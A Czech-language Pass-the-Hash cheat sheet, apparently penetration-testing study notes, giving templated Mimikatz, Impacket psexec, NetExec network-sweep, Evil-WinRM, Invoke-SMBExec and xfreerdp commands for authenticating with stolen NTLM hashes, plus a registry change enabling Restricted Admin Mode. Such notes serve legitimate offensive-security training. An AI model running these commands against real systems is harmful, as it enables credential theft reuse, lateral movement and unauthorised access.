# 🔑 Pass the Hash (PtH)

---

# 1. Co je Pass the Hash?

**Pass the Hash (PtH)** je technika, která umožňuje autentizaci bez znalosti hesla v čistém textu.

Místo hesla se používá:

```text
NTLM Hash
```

Hash může být získán například z:

- SAM databáze
    
- LSASS paměti
    
- NTDS.dit (Domain Controller)
    

---

# 2. Jak PtH funguje

NTLM autentizace funguje na principu:

```text
Client                  Server
  |                       |
  | ---- Username ------> |
  |                       |
  | <---- Challenge ----- |
  |                       |
  | ---- NTLM Response -> |
  |                       |
  |     Access Granted    |
```

Server ověřuje odpověď vytvořenou pomocí NTLM hashe.

Proto:

```text
NTLM Hash ≈ autentizační token
```

Heslo není potřeba crackovat.

---

# 3. Získání NTLM hashe

Nejčastější zdroje:

|Zdroj|Nástroj|
|---|---|
|SAM|secretsdump|
|LSASS|Mimikatz / Pypykatz|
|Active Directory|NTDS.dit|
|Registry Hives|SAM + SYSTEM|

---

# 4. Pass the Hash z Windows

---

# A) Mimikatz

Mimikatz vytvoří nový proces pod identitou uživatele pouze pomocí hashe.

```cmd
mimikatz.exe
```

---

Povolení debug práv:

```text
privilege::debug
```

---

PtH:

```text
sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe
```

---

Výsledek:

```text
Nové CMD pod identitou uživatele
```

Možnosti:

- přístup k síťovým diskům
    
- vzdálené služby
    
- SMB autentizace
    

---

# B) Invoke-TheHash (PowerShell)

PowerShell alternativa bez nutnosti klasického EXE.

Import:

```powershell
Import-Module .\Invoke-TheHash.psd1
```

---

SMB Exec:

```powershell
Invoke-SMBExec `
-Target <IP> `
-Domain <DOMAIN> `
-Username <USER> `
-Hash <NTLM_HASH> `
-Command "<COMMAND>"
```

---

WMI Exec:

```powershell
Invoke-WMIExec
```

---

# 5. Pass the Hash z Kali Linux

---

# A) Impacket

Nejpoužívanější nástroj pro vzdálenou autentizaci.

---

## PsExec

```bash
impacket-psexec <USER>@<IP> \
-hashes :<NTLM_HASH>
```

---

Formát hashů:

```text
LM:NTLM
```

Pokud LM hash nemám:

```text
:NTLM_HASH
```

---

Další Impacket nástroje:

|Nástroj|Použití|
|---|---|
|psexec.py|SMB shell|
|wmiexec.py|WMI shell|
|smbexec.py|SMB command execution|
|dcomexec.py|DCOM execution|

---

# B) NetExec

Použití pro testování více systémů.

---

Jedna IP:

```bash
netexec smb <IP> \
-u Administrator \
-H <NTLM_HASH>
```

---

Celá síť:

```bash
netexec smb <NETWORK>/24 \
-u Administrator \
-H <NTLM_HASH>
```

---

Úspěch:

```text
(Pwn3d!)
```

Znamená:

```text
Platný účet + administrátorská práva
```

---

# C) Evil-WinRM

PowerShell Remoting přes hash.

```bash
evil-winrm \
-i <IP> \
-u Administrator \
-H <NTLM_HASH>
```

---

Použití:

- Windows Server
    
- Active Directory prostředí
    
- PowerShell administrace
    

---

# 6. RDP přes Pass the Hash

RDP může fungovat přes hash pouze při zapnutém:

```text
Restricted Admin Mode
```

---

Povolení:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
/t REG_DWORD ^
/v DisableRestrictedAdmin ^
/d 0x0 ^
/f
```

---

Připojení:

```bash
xfreerdp \
/v:<IP> \
/u:<USER> \
/pth:<NTLM_HASH>
```

---

# 7. Omezení a ochrany

---

## RID 500 Administrator

Vestavěný účet:

```text
Administrator (RID 500)
```

Má nejvyšší šanci fungovat přes PtH.

---

## Lokální administrátoři

Mohou narazit na:

```text
LocalAccountTokenFilterPolicy
```

Pokud není povoleno:

```text
Access Denied
```

---

## Doménové účty

Pokud účet:

- je Domain User
    
- má lokální admin práva
    

PtH většinou funguje.

---

# 8. Nejčastější workflow

```text
Credential Dumping
        |
        ▼
Získání NTLM hashe
        |
        ▼
Ověření hashe
        |
        ▼
NetExec / Impacket
        |
        ▼
Remote Access
        |
        ▼
Privilege Escalation
```

---

# 9. Přehled nástrojů

|Nástroj|Platforma|Účel|
|---|---|---|
|Mimikatz|Windows|Lokální PtH|
|Impacket|Kali|Remote PtH|
|NetExec|Kali|Síťové testování|
|Evil-WinRM|Kali|PowerShell shell|
|xfreerdp|Kali|RDP PtH|
|Invoke-TheHash|Windows|PowerShell PtH|
